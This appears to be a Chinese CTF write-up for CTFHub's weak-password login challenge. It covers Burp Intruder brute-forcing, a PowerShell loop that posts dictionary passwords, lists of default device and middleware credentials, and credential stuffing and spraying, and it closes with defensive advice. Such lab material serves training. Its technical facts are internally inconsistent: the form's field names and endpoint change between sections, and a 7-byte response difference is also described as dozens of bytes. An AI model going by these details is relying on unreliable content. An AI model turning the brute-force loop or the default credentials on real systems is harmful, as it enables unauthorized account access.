---
layout: post
title: CTFHub - 弱口令 Writeup（密码口令）
platform: ctfhub
date: 2026-10-18 21:48:00 +0800
categories: CTF
---

CTFHub - 弱口令 Writeup（密码口令）

一、题目信息

- 平台：CTFHub（技能树 → Web → **密码口令** → 弱口令）
- 题型：Web
- 考点：**弱口令**、登录表单爆破、Burp Intruder / 脚本爆破

```text
登录页：CTFHub WriteUp 管理后台
表单：
    <form action="" method="post" name="admin-login">
      <input name="name"     placeholder="用户名">
      <input name="password" placeholder="密码">
      <input type="hidden" name="referer" value="">
      <input type="checkbox" name="remember" value="1">
    </form>
    注意：提交地址是 /（根路径），提交格式是 form-urlencoded

实际请求：
    POST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    name=admin&password=&referer=

★ 正确密码：123456

响应差异（★ 只有 7 字节！很容易看漏）：
    密码错误 → 200，长度 2269，底部那块 <p> 是空的
    密码正确 → 200，长度 2276，底部 <p> 里出现 flag

    <!-- 密码错误 -->
    <p>
          
    </p>

    <!-- 密码正确 -->
    <p>
        ctfhub{57b4b4364c20cf7993602a90}
    </p>

flag：ctfhub{57b4b4364c20cf7993602a90}
```

> 💡 **本题的坑**：正确/错误的响应长度只差 **7 字节**（2269 vs 2276），
> 在 Burp Intruder 的结果列表里很难一眼看出来。
> 解决办法：用 **Grep - Match** 功能自动标记含 `ctfhub` 的响应（见下面「爆破技巧」一节）。

二、题目分析

**① 什么是弱口令**

```text
弱口令（Weak Password）= 容易被猜到或被破解工具撞到的密码
    · 纯数字：123456 / 111111 / 000000
    · 英文单词：password / admin / root / test
    · 键盘模式：qwerty / 1qaz2wsx / zxcvbnm
    · 常见组合：admin123 / password1 / abc123456
    · 姓名/生日/手机号等个人信息

★ 危害：服务器没有登录失败次数限制时，
  攻击者可以拿字典在几秒钟内试几千个密码 —— 迟早撞上。
```

**② 题目现象**

打开环境，是一个**登录页面**（用户名 + 密码表单）：

```html
<h2>Please login</h2>
<form action="/login" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <button>Login</button>
</form>
```

**手工试几个常见密码**（admin/admin、admin/123456）—— 没进去。

**③ 破题思路**

```text
这题的密码就在【常见弱口令字典】里，只是你猜的那几个不在表里。

所以要用【字典爆破】：
    ① 抓取登录请求，搞清楚提交的字段名和地址
    ② 准备一份常见密码字典
    ③ 逐个密码提交，看哪个的响应"不一样"（登录成功）

工具：
    · Burp Suite 的 Intruder（图形界面，题目/教程推荐）
    · 或者用脚本（我写了一个，纯 Python）
```

三、解题步骤

**方法一：Burp Suite Intruder（教程推荐）**

```text
① 打开 Burp → Proxy → Intercept on
② 浏览器打开登录页，随便输个账号密码（admin / 123456）→ 点登录
③ Burp 拦到请求 → 右键 → Send to Intruder

④ Intruder → Positions 标签：
     点 Clear § 清空自动标记
     手动选中密码值 → 点 Add § 把它设为 payload 位置
         username=admin&password=§123456§

⑤ Payloads 标签：
     Payload type 选 Simple list
     Payload Options → Load → 加载密码字典

⑥ Settings → 取消勾选 "URL-encode these characters"（避免特殊字符被编码）

⑦ 点 Start attack 开始爆破

⑧ 看结果，按 Length（响应长度）或 Status 排序：
     ★ 那个和别人不一样的，就是正确的密码

⑨ 用正确密码登录 → 拿到 flag
```

**怎么判断哪个是正确密码**（关键）：

```text
爆破结果里有一列 Length（响应长度）：
    · 密码错误 → 返回"登录失败"页面，长度都一样
    · 密码正确 → 返回"登录成功"页面，长度【明显不同】

所以：按 Length 排序，找那个异类。

其他判断依据：
    · Status（状态码）变化：比如错误时 200，正确时 302 跳转
    · 响应内容里出现 "欢迎"/"success"/"flag" 这些词
```


**批量试（PowerShell 循环）**：

```powershell
$passwords = @("123456","admin","admin123","password","root","test")
foreach ($p in $passwords) {
    $r = curl.exe -s -X POST "http://challenge-xxx:10800/login" -d "username=admin&password=$p"
    if ($r -match "ctfhub") { Write-Host "★ 成功: $p"; Write-Host $r; break }
    Write-Host "  失败: $p"
}
```

四、延伸知识

**① ★ Burp 爆破的实用技巧：Grep - Match（强烈推荐）**

本题的响应差异只有 7 字节，肉眼很难找。**用 Grep - Match 自动标记**：

```text
① Intruder → Settings 标签
② 往下找 【Grep - Match】 区域 → 点 Add
③ 输入关键字：ctfhub
④ 勾选 【Flag response if match】
⑤ 回到结果列表 → 多出一列，命中的会打勾/高亮
   ★ 一眼就能看到哪个请求成功
```

**为什么好用**：

```text
· 不用比长度、不用比状态码
· 只要响应里出现你指定的字符串（比如 ctfhub / flag / 欢迎），自动标出来
· 差异再小也能发现
```

**其他常用的 Grep 关键字**：

```text
ctfhub     ← 本题
flag
success
欢迎
登录成功
dashboard
```

**② 为什么本题的响应差异这么小**

```text
看登录页的结构：

    <p>
        （密码错误时这里是空的）
    </p>

    <p>
        ctfhub{57b4b4364c20cf7993602a90}    ← 密码正确时插入这个
    </p>

差别就是这一行文字 —— 加上 flag 长度 33 字节，
但 HTML 结构没变，所以总长度只差几十字节。

★ 反过来想：如果出题人做成"登录成功跳转到新页面"，
  差异就会很大（200 vs 302），一眼可见。
  这题故意做得隐蔽 —— 所以要用 Grep - Match。
```


**① 爆破能成功的前提（三个条件）**

```text
① 密码够弱、够常见 → 字典里有它
② 服务器没有失败次数限制 → 试 10000 次和试 1 次反应一样
   ★ 这是能爆破的根本原因
③ 有办法区分"成功"和"失败" → 状态码/长度/内容有差异
```

**② 常见的响应差异信号**

| 信号 | 例子 |
|---|---|
| **状态码** | 失败 200，成功 302（跳转到首页）|
| **响应长度** | 失败 120 字节，成功 560 字节 |
| **响应内容** | 出现"欢迎"/"success"/flag |
| **Cookie** | 成功时下发新的 session Cookie |
| **跳转地址** | 成功时 Location 指向 /dashboard |
| **响应时间** | 盲注场景用这个（高级）|

**③ 常用字典**

```text
· SecLists（最全的字典合集）
    https://github.com/danielmiessler/SecLists
    Passwords/Common-Credentials/10-million-password-list-top-100.txt
    10-million-password-list-top-1000.txt
    rockyou.txt（1400 万条，Kali 自带）

· 小字典（CTF 常用，几千条）
    dirsearch 自带、或者各平台的 top100/top1000

★ CTF 题目一般用 top100 就够了（出题人会挑里面的一个）
```

**④ 相关的其它"口令"问题**

```text
· 默认口令：设备/软件出厂自带的账号密码
    · 路由器：admin/admin、admin/password
    · 摄像头：admin/12345
    · 中间件：Tomcat admin/admin、WebLogic weblogic/weblogic
    · 数据库：MySQL root/空、Redis 无密码
    ★ 实战中最容易得手的一类问题

· 撞库：用别的站点泄露的账号密码来试（因为很多人多个网站用同一密码）
· 密码喷洒：不用一个账号试很多密码，而是用一个密码试很多账号
    （避免触发账号锁定）
```

**⑤ 防护**

```text
· 强制密码复杂度（长度 + 大小写 + 数字 + 符号）
· 登录失败次数限制（比如 5 次锁定 15 分钟）
· 加验证码（图形验证码 / 行为验证码）
· 双因素认证（2FA）
· 登录失败时【不要】返回明确原因（统一返回"用户名或密码错误"）
· 记录并告警异常登录（同 IP 大量失败）
```

五、总结

- **本题核心：登录页用弱口令，拿常见密码字典爆破一遍就出来了。**
- 操作本质三步：

```text
① 抓包搞清楚登录请求（地址 + 字段名）
② 准备字典（top100 通常够）
③ 批量提交，按【响应差异】找正确密码
```

- **判断成功靠"对比"**：先用错误密码建基线，然后看哪个响应的
  状态码/长度/内容与基线不同 —— 那个就是对的。


**配套文件**（都在工作区）：

```text
web_login_brute.py   登录表单弱口令爆破（自动解析表单 + 响应差异判定）
brute-login.bat      双击启动器
```
